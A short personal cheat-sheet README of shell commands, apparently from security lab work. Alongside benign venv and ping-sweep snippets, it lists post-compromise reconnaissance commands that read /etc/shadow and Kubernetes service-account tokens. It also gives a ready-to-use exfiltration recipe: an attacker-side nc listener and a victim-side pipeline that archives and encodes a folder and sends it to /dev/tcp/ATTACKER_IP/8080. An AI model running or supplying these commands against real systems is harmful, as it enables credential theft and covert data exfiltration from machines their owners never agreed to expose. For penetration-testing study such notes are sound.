# knowledge-db
Various commands, scripts and how-to documents

### Retrieve Wi-Fi Passwords on MacOS 

    security find-generic-password -ga "HomeWiFi"

### Bash Ping Sweep 🛰️
---
    subnet="192.168.1"; for ip in {1..254}; do ping -c 1 -W 1 "${subnet}.${ip}" > /dev/null 2>&1 && echo "Host ${subnet}.${ip} is up" || echo "Host ${subnet}.${ip} is down"; done

### Python Virtual Environment 🦾
---
Go to your project folder and run:

    python3 -m venv venv
    source ./venv/bin/activate
    deactivate

### Poking Around 👀
```
id
uname -a
env
df 
mount 
ps -aux 
cat /etc/mtab
docker -version
capsh —print #printCapabilities
ifconfig | grep inet
cat /etc/shadow

/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

### Data Exfiltration via TCP Socket 👀
---
Exfiltrate data over TCP using data encoding. 

- attackerMachine - listen & safe
   - ```nc -lvp 8080 > /tmp/task4-creds.data```

- victimMachine - zip & convert & send via TCP
   - ```tar zcf - folderToZip/ | base64 | dd conv=ebcdic > /dev/tcp/ATTACKER_IP/8080```

- attackerMachine - convert 
   - ```dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar```
- unzip
   - ```tar xvf task4-creds.tar```

